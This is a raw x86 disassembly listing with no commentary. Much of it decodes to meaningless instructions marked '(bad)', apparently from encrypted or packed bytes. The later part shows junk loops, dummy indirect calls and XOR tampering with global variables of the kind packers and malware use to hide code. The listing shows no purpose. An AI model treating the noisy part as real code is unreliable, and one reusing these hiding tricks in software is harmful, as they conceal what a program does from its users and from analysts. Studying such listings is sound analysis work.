  415f38:	jl     0x415ee9
  415f3a:	jne    0x415f40
  415f3c:	sub    BYTE PTR [esi],0x2
  415f3f:	jb     0x415f21
  415f41:	or     ah,BYTE PTR [edx]
  415f43:	rcr    BYTE PTR [ecx-0x579528d7],0xa4
  415f4a:	mov    edi,0x96840175
  415f4f:	fsubr  DWORD PTR [esi+0x203470b3]
  415f55:	(bad)  
  415f56:	xor    ebp,DWORD PTR [esi]
  415f58:	rcr    BYTE PTR [eax+0x1423a8e2],cl
  415f5e:	and    ecx,ebp
  415f60:	shr    DWORD PTR [ecx+0x252ab1],1
  415f66:	add    BYTE PTR ds:0xf7d951e1,dh
  415f6c:	stos   DWORD PTR es:[edi],eax
  415f6d:	xchg   edx,eax
  415f6e:	daa    
  415f6f:	mov    ebp,0xa9ad7954
  415f74:	sbb    dh,dl
  415f76:	mov    BYTE PTR [esi-0x1],ch
  415f79:	ret    0x6bcd
  415f7c:	shl    BYTE PTR [ecx+0x1],0xce
  415f80:	retf   0xd1bc
  415f83:	fmul   DWORD PTR [edx+edx*8+0x71db51b]
  415f8a:	inc    esp
  415f8b:	scas   eax,DWORD PTR es:[edi]
  415f8c:	push   eax
  415f8d:	stos   BYTE PTR es:[edi],al
  415f8e:	enter  0x6ead,0xb9
  415f92:	sub    DWORD PTR [esp+ebp*8+0xc],0x9bccbb4b
  415f9a:	add    DWORD PTR ds:0xabbbfa3e,0x12
  415fa1:	mov    esi,0xe5f04b7f
  415fa6:	or     al,0xae
  415fa8:	mov    esp,0xe3b41bfc
  415fad:	xchg   ecx,eax
  415fae:	pop    edi
  415faf:	out    0xf5,al
  415fb1:	mov    DWORD PTR [ebp+0x40a47373],0xb118c85a
  415fbb:	mov    dh,0x84
  415fbd:	push   ss
  415fbe:	mov    ch,0x66
  415fc0:	(bad)  
  415fc2:	push   ds
  415fc3:	mov    al,ds:0xeaab8248
  415fc8:	jl     0x416047
  415fca:	in     al,0x89
  415fcc:	call   0xb15cfd68
  415fd1:	arpl   si,ax
  415fd3:	or     DWORD PTR [esi],esp
  415fd5:	pop    esi
  415fd6:	rcl    BYTE PTR [ecx],1
  415fd8:	push   cs
  415fd9:	js     0x41601e
  415fdb:	sub    DWORD PTR [eax+0x3d26e1f0],edi
  415fe1:	xchg   edi,eax
  415fe2:	xor    dh,BYTE PTR [ecx-0x69]
  415fe5:	pop    ebp
  415fe6:	ror    BYTE PTR [ecx-0x52],0xfa
  415fea:	inc    edx
  415feb:	pop    es
  415fec:	xchg   edx,eax
  415fed:	jmp    0x415fcc
  415fef:	adc    bl,BYTE PTR [edx-0x476d23ca]
  415ff5:	mov    bl,0x61
  415ff7:	lods   eax,DWORD PTR ds:[esi]
  415ff8:	ficom  DWORD PTR [ecx]
  415ffa:	mov    cl,0x6c
  415ffc:	outs   dx,DWORD PTR ds:[esi]
  415ffd:	lahf   
  415ffe:	sub    DWORD PTR [ecx-0x79],edi
  416001:	ins    BYTE PTR es:[edi],dx
  416002:	ret    
  416003:	jb     0x416009
  416005:	xor    edi,ebx
  416007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416008:	inc    edi
  416009:	sbb    DWORD PTR [edx],0x3cf6c537
  41600f:	pop    ss
  416010:	(bad)  [ebx]
  416012:	cli    
  416013:	adc    DWORD PTR [edi+0x7f534029],ecx
  416019:	loopne 0x416006
  41601b:	jmp    0x7b38a33d
  416020:	fwait
  416021:	loop   0x41604b
  416023:	ficomp WORD PTR [eax-0x351b7db6]
  416029:	stos   DWORD PTR es:[edi],eax
  41602a:	pop    ss
  41602b:	lods   al,BYTE PTR ds:[esi]
  41602c:	fild   DWORD PTR [esi-0x6f]
  41602f:	retf   0xd197
  416032:	jg     0x416093
  416034:	icebp  
  416035:	in     eax,0xf3
  416037:	loopne 0x415fce
  416039:	sahf   
  41603a:	iret   
  41603b:	lds    ebx,FWORD PTR [ecx-0x6c]
  41603e:	jo     0x416078
  416040:	out    dx,eax
  416041:	sti    
  416042:	mov    WORD PTR [edi+eiz*1+0x6a8d2861],es
  416049:	cmp    ecx,DWORD PTR [edx]
  41604b:	sahf   
  41604c:	outs   dx,BYTE PTR ds:[esi]
  41604d:	in     al,dx
  41604e:	jno    0x416003
  416050:	jle    0x4160cc
  416052:	loope  0x415ff9
  416054:	dec    ecx
  416055:	ret    0xfe62
  416058:	cmc    
  416059:	int3   
  41605a:	add    ah,0x6b
  41605d:	call   0xe821:0x9f7ff9af
  416064:	les    ecx,FWORD PTR [ebx-0x34]
  416067:	xchg   ecx,eax
  416068:	inc    edx
  416069:	loop   0x416039
  41606b:	inc    ebp
  41606c:	ja     0x416073
  41606e:	stos   DWORD PTR es:[edi],eax
  41606f:	pop    edi
  416070:	inc    eax
  416071:	push   0x7f4a8fcc
  416076:	push   esp
  416077:	and    BYTE PTR [ebx+edx*4+0x16ed95fa],bh
  41607e:	je     0x416089
  416080:	xor    BYTE PTR [esp+ebp*1-0x61],ch
  416084:	in     al,0xc3
  416086:	xor    cl,bl
  416088:	stos   BYTE PTR es:[edi],al
  416089:	cs mov al,0x39
  41608c:	lock fpatan 
  41608f:	call   0xd11d:0xd7b0d5c7
  416096:	in     al,dx
  416097:	cmp    BYTE PTR [esi-0x26],0x6f
  41609b:	fsubr  DWORD PTR fs:[ebp+0x7]
  41609f:	mov    ds:0x46e5095b,al
  4160a4:	retf   
  4160a5:	add    esi,ecx
  4160a7:	mov    esp,0x79ed270a
  4160ac:	dec    esp
  4160ad:	inc    esi
  4160ae:	pop    ds
  4160af:	mov    eax,0x714decc5
  4160b4:	dec    ebp
  4160b5:	test   eax,0x6a871835
  4160ba:	xor    DWORD PTR [edx+0x6047f2f7],ecx
  4160c0:	adc    al,0x51
  4160c2:	mov    DWORD PTR [edx],edx
  4160c4:	mov    al,ds:0x285dbba0
  4160c9:	out    dx,eax
  4160ca:	inc    ebx
  4160cb:	ret    0xcd1c
  4160ce:	pop    ds
  4160cf:	jne    0x41613b
  4160d1:	icebp  
  4160d2:	(bad)  [edi+0x3ab56a6b]
  4160d8:	loopne 0x416072
  4160da:	ja     0x4160a6
  4160dc:	aaa    
  4160dd:	fisttp DWORD PTR [edi]
  4160df:	ror    BYTE PTR [esp+esi*2+0x741246f0],cl
  4160e6:	jp     0x4160a0
  4160e8:	(bad)  
  4160e9:	adc    BYTE PTR [eax+esi*2-0x56b131e5],bh
  4160f0:	je     0x4160ed
  4160f2:	inc    edi
  4160f3:	loopne 0x4160e0
  4160f5:	ror    BYTE PTR [ebx-0x1aee301a],1
  4160fb:	es mov ah,ah
  4160fe:	jns    0x416089
  416100:	and    DWORD PTR [eax-0x61],0xe5befb7c
  416107:	add    dl,BYTE PTR [ebp+0x35]
  41610a:	add    esi,DWORD PTR [eax-0x70665c08]
  416110:	repz addr16 jl 0x416187
  416114:	out    dx,eax
  416115:	jmp    0x4160c5
  416117:	div    ebx
  416119:	push   edi
  41611a:	jg     0x416175
  41611c:	mov    ds:0x397b86c9,al
  416121:	xchg   edi,eax
  416122:	mov    edx,0x528635ec
  416127:	and    ch,0xbf
  41612a:	and    ch,ah
  41612c:	daa    
  41612d:	outs   dx,DWORD PTR ds:[esi]
  41612e:	pop    ss
  41612f:	dec    ax
  416131:	push   0x3c4a0359
  416136:	or     esp,DWORD PTR [edi-0x7dc46590]
  41613c:	inc    ebx
  41613d:	sbb    eax,0xb30dffef
  416142:	and    ah,bh
  416144:	out    dx,eax
  416145:	jle    0x41612a
  416147:	les    edi,FWORD PTR [esi-0x42]
  41614a:	js     0x41619b
  41614c:	mov    WORD PTR [esi-0x7c],ss
  41614f:	sahf   
  416150:	test   DWORD PTR [edi+0x7011057c],esp
  416156:	mov    WORD PTR [esi+0x197ade2c],gs
  41615c:	push   cs
  41615d:	jle    0x416120
  41615f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416160:	test   BYTE PTR [esi],bl
  416162:	jle    0x416166
  416164:	add    cl,ch
  416166:	push   eax
  416167:	xor    dl,BYTE PTR [ecx+eiz*2-0x18]
  41616b:	shl    ah,0x4e
  41616e:	or     ebx,eax
  416170:	push   0x5a
  416172:	sub    eax,0x768a78ce
  416177:	jb     0x41613a
  416179:	sbb    esi,eax
  41617b:	(bad)  
  41617c:	dec    edx
  41617d:	sbb    eax,0x7a3b9367
  416182:	ret    0x252c
  416185:	repnz shl BYTE PTR ss:[ecx+0x423c3965],1
  41618d:	gs push es
  41618f:	adc    BYTE PTR [edi],ah
  416191:	pusha  
  416192:	and    ebp,eax
  416194:	ja     0x4161e1
  416196:	adc    ebp,edx
  416198:	mov    esp,0xe6a2bf39
  41619d:	in     al,dx
  41619e:	scas   al,BYTE PTR es:[edi]
  41619f:	cmp    al,0x8d
  4161a1:	cmp    BYTE PTR [esi+ebp*4+0x2ee6717b],al
  4161a8:	aad    0x9b
  4161aa:	call   0x12141517
  4161af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161b0:	and    dh,bl
  4161b2:	jne    0x4161d4
  4161b4:	sti    
  4161b5:	std    
  4161b6:	out    dx,al
  4161b7:	je     0x4161d4
  4161b9:	jp     0x41616f
  4161bb:	jns    0x416170
  4161bd:	ficom  WORD PTR [edi+0x9d2139d]
  4161c3:	sbb    al,0x19
  4161c5:	fstp   TBYTE PTR [esi+0x1df9053]
  4161cb:	cld    
  4161cc:	mov    ds:0x5958cb7f,eax
  4161d1:	outs   dx,BYTE PTR ds:[esi]
  4161d2:	mov    ds:0x8dba92df,al
  4161d7:	adc    bl,dl
  4161d9:	out    dx,eax
  4161da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161db:	retf   
  4161dc:	sub    BYTE PTR es:[esi],dl
  4161df:	sbb    esp,DWORD PTR [eax-0x1c]
  4161e2:	fs lahf 
  4161e4:	xchg   BYTE PTR [ebp-0x2786a1c4],cl
  4161ea:	jns    0x416174
  4161ec:	xchg   eax,edi
  4161ee:	mov    edi,0xc0f0484b
  4161f3:	dec    ebx
  4161f4:	pop    es
  4161f5:	xchg   edi,eax
  4161f6:	scas   eax,DWORD PTR es:[edi]
  4161f7:	jle    0x416205
  4161f9:	push   ebx
  4161fa:	cli    
  4161fb:	adc    eax,0x66550f09
  416200:	cmp    BYTE PTR [esi-0x58b1803d],ah
  416206:	sbb    BYTE PTR [edx+eax*1],ch
  416209:	inc    edi
  41620a:	fst    DWORD PTR [ebx]
  41620c:	jae    0x416210
  41620e:	pop    eax
  41620f:	stos   DWORD PTR es:[edi],eax
  416210:	jg     0x4161b8
  416212:	lods   al,BYTE PTR ds:[esi]
  416213:	outs   dx,DWORD PTR ds:[esi]
  416214:	and    ebx,DWORD PTR [ecx-0x59]
  416217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416218:	pop    ss
  416219:	test   al,0xbe
  41621b:	cmp    DWORD PTR [edx],ecx
  41621d:	dec    edi
  41621e:	aam    0xb3
  416220:	jb     0x416258
  416222:	pop    edi
  416223:	test   eax,0x535f4439
  416228:	or     eax,0x2d66f17f
  41622d:	loop   0x41622e
  41622f:	aam    0x4c
  416231:	(bad)  
  416232:	xchg   ebp,eax
  416233:	mov    ebp,DWORD PTR [eax+0xa38e917]
  416239:	lods   eax,DWORD PTR ds:[esi]
  41623a:	lea    esi,[edi+eax*1]
  41623d:	setg   BYTE PTR [ebx-0x19]
  416241:	aas    
  416242:	iret   
  416243:	or     bl,BYTE PTR [ecx]
  416245:	xchg   edx,eax
  416246:	sbb    esp,DWORD PTR [ebp+0x63]
  416249:	test   eax,0x6d02f89e
  41624e:	sbb    DWORD PTR [edi-0x39014fa],ebx
  416254:	(bad)  
  416255:	in     al,dx
  416256:	shl    DWORD PTR [edx+edi*1-0x23e7c411],cl
  41625d:	sbb    BYTE PTR [eax],0xd9
  416260:	mov    ds:0x1024ec2d,al
  416265:	in     al,dx
  416266:	mov    dh,0x8f
  416268:	jmp    0x416283
  41626a:	mov    al,0x54
  41626c:	dec    esi
  41626d:	lds    eax,FWORD PTR [edx+0x2c092dc5]
  416273:	adc    al,0x12
  416275:	fistp  DWORD PTR ds:0x5ac9d4d
  41627b:	xor    DWORD PTR [ecx],ebx
  41627d:	loopne 0x416212
  41627f:	pushf  
  416280:	mov    WORD PTR [edi-0x6ddab390],es
  416286:	pop    edx
  416287:	(bad)  
  416288:	jg     0x416265
  41628a:	test   al,0x26
  41628c:	ins    DWORD PTR es:[edi],dx
  41628d:	enter  0x8ed7,0x28
  416291:	xadd   BYTE PTR [ebp-0x293acb05],ch
  416298:	adc    BYTE PTR [esi+0x66a1e1f4],bh
  41629e:	mov    BYTE PTR [esi-0x1f],dl
  4162a1:	int3   
  4162a2:	mov    DWORD PTR [ebx+esi*2],ecx
  4162a5:	outs   dx,DWORD PTR ds:[esi]
  4162a6:	or     ebp,DWORD PTR [ebx+0x57a959aa]
  4162ac:	mov    ebp,0xd51e3d0e
  4162b1:	aaa    
  4162b2:	jecxz  0x416329
  4162b4:	int    0x23
  4162b6:	push   esi
  4162b7:	add    DWORD PTR [edx-0x7],ebx
  4162ba:	ficom  WORD PTR [ebp-0x2288f3c6]
  4162c0:	dec    esi
  4162c1:	and    al,0x57
  4162c3:	dec    edi
  4162c4:	sbb    al,0x4d
  4162c6:	sti    
  4162c7:	push   esp
  4162c8:	jmp    FWORD PTR [eax+eiz*1]
  4162cb:	fbstp  TBYTE PTR [eax+eax*2-0x47a9a6f1]
  4162d2:	cdq    
  4162d3:	jmp    0x416335
  4162d5:	out    dx,eax
  4162d6:	test   eax,0x342507ae
  4162db:	sub    bl,bh
  4162dd:	jns    0x4162df
  4162df:	(bad)  
  4162e0:	retf   0xc9f9
  4162e3:	(bad)  
  4162e5:	imul   ebx,DWORD PTR [ebp-0x44],0xa6000fc5
  4162ec:	fisubr WORD PTR [ebx]
  4162ee:	dec    ebx
  4162ef:	jge    0x416300
  4162f1:	xor    esi,ebp
  4162f3:	mov    bl,bh
  4162f5:	outs   dx,DWORD PTR ds:[esi]
  4162f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162f7:	sbb    eax,0xcf325a38
  4162fc:	stc    
  4162fd:	(bad)  
  4162fe:	dec    esp
  4162ff:	mov    DWORD PTR [eax+ebp*2],ecx
  416302:	sbb    DWORD PTR [ecx-0x412dba39],eax
  416308:	stc    
  416309:	mov    al,ds:0xe1f62e15
  41630e:	jmp    0x8153420d
  416313:	push   edx
  416314:	fs ffreep st(7)
  416317:	aas    
  416318:	stos   BYTE PTR es:[edi],al
  416319:	arpl   WORD PTR [esi+eiz*2],sp
  41631c:	aaa    
  41631d:	cmp    DWORD PTR [esi],esp
  41631f:	pusha  
  416320:	mov    WORD PTR [esi+0x12],ds
  416323:	cmp    DWORD PTR [eax+eax*1-0x47afd18f],esp
  41632a:	push   ss
  41632b:	or     BYTE PTR [esi-0x354591],bh
  416331:	push   edi
  416332:	pop    eax
  416333:	leave  
  416334:	(bad)  
  416335:	in     al,dx
  416336:	mov    ds:0x784b43c3,eax
  41633b:	xor    ch,BYTE PTR [esi-0x1afd5a6a]
  416341:	dec    ebp
  416342:	xor    al,0x27
  416344:	pop    ebp
  416345:	sti    
  416346:	mov    dl,0xc1
  416348:	inc    edx
  416349:	scas   eax,DWORD PTR es:[edi]
  41634a:	or     al,0xd7
  41634c:	pop    esi
  41634d:	scas   al,BYTE PTR es:[edi]
  41634e:	and    ch,dl
  416350:	adc    ah,ch
  416352:	mov    eax,ds:0x50c866e7
  416357:	sbb    ch,BYTE PTR [edi+ecx*4-0x522886d3]
  41635e:	cmc    
  41635f:	mov    ?,WORD PTR [eax+0x426f317]
  416365:	xor    esp,DWORD PTR [esi]
  416367:	idiv   BYTE PTR [ebp+0x25]
  41636a:	and    BYTE PTR [ecx-0x2d2e7603],ah
  416370:	xchg   edi,eax
  416371:	lods   al,BYTE PTR ds:[esi]
  416372:	fnstcw WORD PTR [eax+0x40]
  416375:	addr16 add esp,ebx
  416378:	in     eax,dx
  416379:	data16 ss cmp al,0x85
  41637d:	jbe    0x4163ea
  41637f:	pop    esp
  416380:	mov    al,0xb4
  416382:	sbb    al,BYTE PTR [ecx+0x6a]
  416385:	push   esp
  416386:	xor    al,0xb4
  416388:	push   ss
  416389:	dec    ebp
  41638a:	cmp    DWORD PTR [ecx-0x6c22da7d],edi
  416390:	push   es
  416391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416393:	popf   
  416394:	mov    WORD PTR [edx],fs
  416396:	pop    es
  416397:	sar    BYTE PTR [edx+edi*2],0xbc
  41639b:	pop    edi
  41639c:	into   
  41639d:	popf   
  41639e:	scas   eax,DWORD PTR es:[edi]
  41639f:	push   edi
  4163a0:	ja     0x4163e6
  4163a2:	lods   eax,DWORD PTR ds:[esi]
  4163a3:	fbld   TBYTE PTR [eax]
  4163a5:	mov    esp,0x42f16258
  4163aa:	lods   al,BYTE PTR ds:[esi]
  4163ab:	mov    cl,0x7b
  4163ad:	sub    eax,0x3c07497a
  4163b2:	ret    0x8d0b
  4163b5:	xchg   esp,eax
  4163b6:	inc    ecx
  4163b7:	je     0x416376
  4163b9:	stc    
  4163ba:	popf   
  4163bb:	stos   DWORD PTR es:[edi],eax
  4163bc:	and    DWORD PTR [ebx],edi
  4163be:	sub    esi,DWORD PTR [edx+0x68]
  4163c1:	dec    eax
  4163c2:	pop    ebp
  4163c3:	xchg   DWORD PTR [edi-0x15],edx
  4163c6:	mov    ch,0x70
  4163c8:	dec    edi
  4163c9:	shl    BYTE PTR [edx-0x2c09ce36],cl
  4163cf:	shl    BYTE PTR [eax+0x5b1f5719],1
  4163d5:	sahf   
  4163d6:	mov    cl,BYTE PTR ds:0xb02de59a
  4163dc:	xor    al,0x12
  4163de:	gs sub al,0x8c
  4163e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163e2:	add    eax,0x82bea53e
  4163e7:	sub    al,0x5c
  4163e9:	popa   
  4163ea:	popf   
  4163eb:	cmp    ebp,DWORD PTR cs:[ebx]
  4163ee:	pop    ecx
  4163ef:	sub    ecx,DWORD PTR [esi+ebx*8]
  4163f2:	lock add eax,0x8f3124f5
  4163f8:	ins    DWORD PTR es:[edi],dx
  4163f9:	mov    esp,0x73f49711
  4163fe:	jns    0x416448
  416400:	ret    
  416401:	fs push 0x19ed5c8f
  416407:	jp     0x41645f
  416409:	unpckhps xmm0,xmm4
  41640c:	push   esi
  41640d:	sub    al,0x18
  41640f:	pop    ebp
  416410:	jmp    0x416439
  416412:	mov    ah,BYTE PTR [edx]
  416414:	ret    
  416415:	push   eax
  416416:	pop    esp
  416417:	ds test ah,bl
  41641a:	cmc    
  41641b:	mov    bh,0x30
  41641d:	mov    eax,ds:0xd5b36868
  416422:	jns    0x416430
  416424:	xor    BYTE PTR [edx-0x6e],0xf0
  416428:	aam    0xf9
  41642a:	xor    al,0x6a
  41642c:	test   dh,dh
  41642e:	call   0x2ae4:0xec243e0b
  416435:	bnd ret 
  416437:	aad    0x51
  416439:	mov    ecx,0x58e40ef8
  41643e:	pop    es
  41643f:	dec    ecx
  416440:	mov    cl,0xb9
  416442:	stc    
  416443:	iret   
  416444:	mov    ah,al
  416446:	inc    ecx
  416447:	pop    esp
  416448:	inc    esp
  416449:	repnz aam 0x19
  41644c:	jmp    0x916a:0xd3edb977
  416453:	imul   ebx,DWORD PTR [eax-0x7b],0xffffffdb
  416457:	ja     0x4164b7
  416459:	and    eax,0x37572a86
  41645e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41645f:	mov    esi,0x6f40035c
  416464:	fstp   QWORD PTR [ebp+0x7b]
  416467:	or     al,0x46
  416469:	repnz div edx
  41646c:	loope  0x416449
  41646e:	psubd  mm6,mm4
  416471:	adc    eax,esp
  416473:	dec    DWORD PTR [eax-0x2f128de2]
  416479:	cmp    eax,0xd80cca6f
  41647e:	sub    BYTE PTR [edx],dh
  416480:	adc    al,0xe9
  416482:	jmp    0x4017:0x5063a47f
  416489:	hlt    
  41648a:	rcl    ch,1
  41648c:	inc    ebp
  41648d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41648e:	inc    eax
  41648f:	push   eax
  416490:	cs dec ecx
  416492:	arpl   di,di
  416494:	mov    DWORD PTR [esi],edx
  416496:	sbb    esi,DWORD PTR [edi]
  416498:	stc    
  416499:	xchg   ebx,eax
  41649a:	xchg   BYTE PTR [edi-0x764f902f],ch
  4164a0:	sbb    al,BYTE PTR [eax]
  4164a2:	adc    bh,dh
  4164a4:	and    ah,BYTE PTR [ebx+ebp*8]
  4164a7:	cmp    DWORD PTR [ecx+0x11],ebx
  4164aa:	ret    
  4164ab:	pushf  
  4164ac:	pusha  
  4164ad:	nop    DWORD PTR [esi+0x79]
  4164b1:	sahf   
  4164b2:	adc    bh,ah
  4164b4:	mov    dl,0xc6
  4164b6:	sub    al,BYTE PTR [eax-0x5037baa6]
  4164bc:	jecxz  0x4164ca
  4164be:	retf   0x36d7
  4164c1:	xchg   ebx,eax
  4164c2:	scas   al,BYTE PTR es:[edi]
  4164c3:	fst    QWORD PTR [edx+0x24c9ac64]
  4164c9:	call   DWORD PTR [ebp-0x40]
  4164cc:	cld    
  4164cd:	sbb    eax,ebp
  4164cf:	mov    ds:0xd5ba02ad,eax
  4164d4:	sar    BYTE PTR [esi-0x29],cl
  4164d7:	xchg   esi,eax
  4164d8:	add    DWORD PTR [ecx+0x1aa02767],0xfffffff0
  4164df:	repz fwait
  4164e1:	dec    edi
  4164e2:	or     bh,dh
  4164e4:	xchg   eax,esp
  4164e6:	ucomiss xmm1,DWORD PTR [edi+eiz*1+0x5da90ac1]
  4164ee:	jmp    0x3082c3ee
  4164f3:	jbe    0x4164fb
  4164f5:	add    al,0xc3
  4164f7:	mov    al,0x87
  4164f9:	cwde   
  4164fa:	ficom  DWORD PTR [ecx-0x666f8ff8]
  416500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416501:	push   ecx
  416502:	xor    BYTE PTR [ebx-0x22],bl
  416505:	push   ebx
  416506:	data16 cmp WORD PTR [ebx+0x2],ax
  41650b:	and    eax,0x6624290f
  416510:	xor    al,0x8
  416512:	loope  0x416527
  416514:	daa    
  416515:	jno    0x41651d
  416517:	pop    ds
  416518:	inc    edi
  416519:	pop    edi
  41651a:	cld    
  41651b:	mov    cl,0xf2
  41651d:	inc    edi
  41651e:	jmp    0x4164bf
  416520:	mov    dh,0x58
  416522:	test   eax,0x458864d5
  416527:	loope  0x41654d
  416529:	dec    ecx
  41652a:	dec    eax
  41652b:	push   cs
  41652c:	lods   eax,DWORD PTR ds:[esi]
  41652d:	les    edi,FWORD PTR [edx]
  41652f:	outs   dx,DWORD PTR ds:[esi]
  416530:	and    eax,0xfb02b1c7
  416535:	fisttp WORD PTR [ecx+eiz*1]
  416538:	mov    dh,0xa7
  41653a:	inc    edi
  41653b:	popf   
  41653c:	push   0x5e
  41653e:	xchg   dh,bl
  416540:	sub    DWORD PTR [esi+ecx*2],ebx
  416543:	movzx  ecx,WORD PTR [ecx+edx*4]
  416547:	xor    DWORD PTR ds:0x428ea7,0x428e77
  416551:	xor    ecx,0x8a9b
  416557:	mov    DWORD PTR ds:0x428ea3,0x5f74
  416561:	add    ecx,edi
  416563:	mov    edi,DWORD PTR [ebp-0xc]
  416566:	mov    DWORD PTR ds:0x428e73,0x23ca
  416570:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416577:	inc    edx
  416578:	mov    ecx,DWORD PTR [ebp-0x10]
  41657b:	mov    DWORD PTR ds:0x428e37,0x4a6a
  416585:	cmp    edx,ecx
  416587:	mov    DWORD PTR ds:0x428e73,0x3902
  416591:	jne    0x414140
  416597:	mov    ecx,DWORD PTR [ebp-0x18]
  41659a:	mov    DWORD PTR ds:0x428ebf,0x19
  4165a4:	cmp    DWORD PTR ds:0x428ebf,0x0
  4165ab:	je     0x4165e3
  4165b1:	cmp    DWORD PTR ds:0x428ebf,0x1d
  4165b8:	jle    0x4165e3
  4165be:	jmp    0x4165d1
  4165c3:	push   DWORD PTR [ebp-0x14]
  4165c6:	push   0x8b92
  4165cb:	call   DWORD PTR ds:0x42aa13
  4165d1:	mov    edx,DWORD PTR ds:0x428ebf
  4165d7:	dec    edx
  4165d8:	mov    DWORD PTR ds:0x428ebf,edx
  4165de:	jmp    0x4165a4
  4165e3:	mov    edx,DWORD PTR [ebp+0x10]
  4165e6:	and    DWORD PTR ds:0x428e83,0x0
  4165f0:	mov    edi,DWORD PTR ds:0x428e83
  4165f6:	inc    edi
  4165f7:	mov    DWORD PTR ds:0x428e83,edi
  4165fd:	cmp    DWORD PTR ds:0x428e83,0x2c
  416604:	jg     0x416627
  41660a:	jmp    0x41661a
  41660f:	push   0x428e8f
  416614:	call   DWORD PTR ds:0x42aa17
  41661a:	cmp    DWORD PTR ds:0x428e83,0x1e
  416621:	jb     0x4165f0
  416627:	xor    ecx,eax
  416629:	add    DWORD PTR ds:0x428e97,edx
  41662f:	add    ecx,esi
  416631:	xor    DWORD PTR ds:0x428e57,edx
  416637:	mov    DWORD PTR [edx],ecx
  416639:	sbb    edi,ecx
  41663b:	mov    ecx,DWORD PTR [ebp-0x18]
  41663e:	xor    DWORD PTR ds:0x428ec7,ebx
  416644:	xor    ecx,eax
  416646:	add    ecx,esi
  416648:	mov    DWORD PTR ds:0x428ebb,0x1e
  416652:	cmp    DWORD PTR ds:0x428ebb,0x0
  416659:	je     0x4166a8
  41665f:	cmp    DWORD PTR ds:0x428ebb,0x2
  416666:	jbe    0x4166a8
  41666c:	jmp    0x41667c
  416671:	push   0x71f6
  416676:	call   DWORD PTR ds:0x42aa1b
  41667c:	cmp    DWORD PTR ds:0x428ebb,0x3
  416683:	jne    0x416696
  416689:	mov    edi,DWORD PTR ds:0x428ebb
  41668f:	dec    edi
  416690:	mov    DWORD PTR ds:0x428ebb,edi
  416696:	mov    edi,DWORD PTR ds:0x428ebb
  41669c:	dec    edi
  41669d:	mov    DWORD PTR ds:0x428ebb,edi
  4166a3:	jmp    0x416652
  4166a8:	mov    DWORD PTR [ebp-0xc],ecx
  4166ab:	sbb    DWORD PTR ds:0x428eab,0x39c1
  4166b5:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4166bc:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4166c3:	sbb    edi,ecx
  4166c5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4166cc:	mov    DWORD PTR ds:0x428e6f,0x17
  4166d6:	cmp    DWORD PTR ds:0x428e6f,0x0
  4166dd:	je     0x41671c
  4166e3:	cmp    DWORD PTR ds:0x428e6f,0x23
  4166ea:	jl     0x41671c
  4166f0:	jmp    0x41670a
  4166f5:	push   0x4cf4
  4166fa:	push   0x428e23
  4166ff:	push   0x15e1
  416704:	call   DWORD PTR ds:0x42aa1f
  41670a:	mov    edi,DWORD PTR ds:0x428e6f
  416710:	dec    edi
  416711:	mov    DWORD PTR ds:0x428e6f,edi
  416717:	jmp    0x4166d6
  41671c:	mov    ecx,DWORD PTR [ebp-0x14]
  41671f:	add    edi,DWORD PTR ds:0x428e3f
  416725:	mov    DWORD PTR [ebp+0x8],ecx
  416728:	sub    edi,0x632b
  41672e:	mov    ecx,DWORD PTR [ebp+0x8]
  416731:	xor    DWORD PTR ds:0x428e53,edi
  416737:	xor    ecx,eax
  416739:	mov    edi,DWORD PTR ds:0x428e9b
  41673f:	adc    DWORD PTR ds:0x428ebb,edi
  416745:	add    ecx,esi
  416747:	mov    edi,DWORD PTR ds:0x428e43
  41674d:	mov    ecx,0x242ebf1
  416752:	mov    edi,0xf641bf2
  416757:	mov    DWORD PTR ds:0x428e77,0x250d
  416761:	je     0x4191f8
  416767:	mov    edx,DWORD PTR [ebp+0x8]
  41676a:	mov    ebx,DWORD PTR [ebp-0x8]
  41676d:	neg    DWORD PTR ds:0x428e8f
  416773:	xor    edx,eax
  416775:	xor    ebx,eax
  416777:	sub    edx,ebx
  416779:	xor    DWORD PTR ds:0x428e63,edx
  41677f:	sub    edx,esi
  416781:	add    DWORD PTR ds:0x428eaf,0x644f
  41678b:	xor    edx,eax
  41678d:	or     DWORD PTR ds:0x428e27,0x4378
  416797:	mov    DWORD PTR [ebp+0x8],edx
  41679a:	and    DWORD PTR ds:0x428e67,0x0
  4167a4:	mov    edx,DWORD PTR ds:0x428e67
  4167aa:	inc    edx
  4167ab:	mov    DWORD PTR ds:0x428e67,edx
  4167b1:	cmp    DWORD PTR ds:0x428e67,0xe
  4167b8:	jl     0x4167f7
  4167be:	jmp    0x4167ce
  4167c3:	push   0x428111
  4167c8:	call   DWORD PTR ds:0x42a9eb
  4167ce:	cmp    DWORD PTR ds:0x428e67,0xd
  4167d5:	jne    0x4167ea
  4167db:	xor    edx,edx
  4167dd:	xor    edx,DWORD PTR ds:0x428e67
  4167e3:	inc    edx
  4167e4:	mov    DWORD PTR ds:0x428e67,edx
  4167ea:	cmp    DWORD PTR ds:0x428e67,0x1e
  4167f1:	jb     0x4167a4
  4167f7:	mov    edx,DWORD PTR [ebp+0x8]
  4167fa:	mov    ebx,DWORD PTR [ebp-0x58]
  4167fd:	adc    DWORD PTR ds:0x428eaf,0x428e9b
  416807:	add    edx,0x5708e4
  41680d:	imul   edx,ebx
  416810:	mov    ebx,DWORD PTR ds:0x428e87
  416816:	or     DWORD PTR ds:0x428e57,ebx
  41681c:	mov    DWORD PTR [ebp-0x58],edx
  41681f:	mov    edx,DWORD PTR ds:0x42972f
  416825:	mov    ebx,DWORD PTR ds:0x429baf
  41682b:	sub    ebx,edx
  41682d:	xor    edx,DWORD PTR [edx+ebx*1]
